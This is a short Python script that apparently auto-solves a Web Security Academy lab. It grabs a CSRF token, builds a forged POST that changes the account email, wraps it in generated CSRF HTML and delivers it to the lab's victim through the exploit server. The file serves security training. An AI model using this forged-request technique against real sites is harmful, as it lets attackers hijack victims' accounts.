from web_security_academy.core.logger import logger
from web_security_academy.core.utils import generate_csrf_html

from urllib.parse import urljoin
from requests import Request


def solve_lab(session):
    csrf = session.get_csrf_token("/login")
    logger.info(f'CSRF token from "/login": {csrf}')

    req = Request(
        "POST",
        urljoin(session.url, "/my-account/change-email"),
        data={"email": "user@example.com", "csrf": csrf},
    )

    exploit_server = session.exploit_server()
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    body = generate_csrf_html(req)
    exploit_server.deliver_exploit_to_victim("/exploit", headers, body)
